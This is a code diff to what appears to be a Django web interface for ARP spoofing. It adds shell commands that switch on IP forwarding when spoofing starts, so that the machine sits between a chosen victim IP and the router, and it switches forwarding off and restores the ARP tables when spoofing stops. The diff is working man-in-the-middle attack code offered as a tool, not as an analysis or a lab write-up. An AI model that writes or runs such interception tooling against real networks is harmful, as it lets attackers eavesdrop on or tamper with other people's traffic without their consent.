@@ -12,6 +12,28 @@ is_spoofing = False
 packet_count = 0
 
 # Utility Functions
+def enable_port_forwarding():
+    """
+    Enables port forwarding by executing the necessary command.
+    """
+    try:
+        subprocess.run(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
+        print("[INFO] Port forwarding enabled.")
+        return True
+    except subprocess.CalledProcessError as e:
+        print(f"[ERROR] Failed to enable port forwarding: {e}")
+        return False
+
+def disable_port_forwarding():
+    """
+    Disables port forwarding by executing the necessary command.
+    """
+    try:
+        subprocess.run(["echo 0 >/proc/sys/net/ipv4/ip_forward"], shell=True, check=True)
+        print("[INFO] Port forwarding disabled.")
+    except subprocess.CalledProcessError as e:
+        print(f"[ERROR] Failed to disable port forwarding: {e}")
+
 def find_gateway(request):
     """
     Captures the router's IP and MAC address dynamically using the `arp -a` command.
@@ -94,6 +116,13 @@ def start_spoofing(request):
             messages.error(request, "Spoofing is already running.")
             return redirect("arp_spoofer:index")
 
+        # Enable port forwarding
+        if enable_port_forwarding():
+            messages.success(request, "Port forwarding enabled successfully.")
+        else:
+            messages.error(request, "Failed to enable port forwarding.")
+            return redirect("arp_spoofer:index")
+
         # Save the selected IPs in session
         request.session["selected_target_ip"] = victim_ip
         request.session["selected_router_ip"] = router_ip
@@ -109,7 +138,7 @@ def start_spoofing(request):
 
 def stop_spoofing(request):
     """
-    Stops spoofing and restores ARP tables.
+    Stops spoofing, restores ARP tables, and disables port forwarding.
     """
     global is_spoofing
     if request.method == "POST":
@@ -128,8 +157,9 @@ def stop_spoofing(request):
         time.sleep(3)  # Allow spoofing thread to exit
         restore(victim_ip, router_ip)
         restore(router_ip, victim_ip)
-        print("[+] Spoofing stopped and ARP tables restored.")
-        messages.success(request, "Spoofing stopped successfully.")
+        disable_port_forwarding()
+        print("[+] Spoofing stopped and ARP tables restored. Port forwarding disabled.")
+        messages.success(request, "Spoofing stopped successfully and port forwarding disabled.")
         return redirect("arp_spoofer:index")
 
 
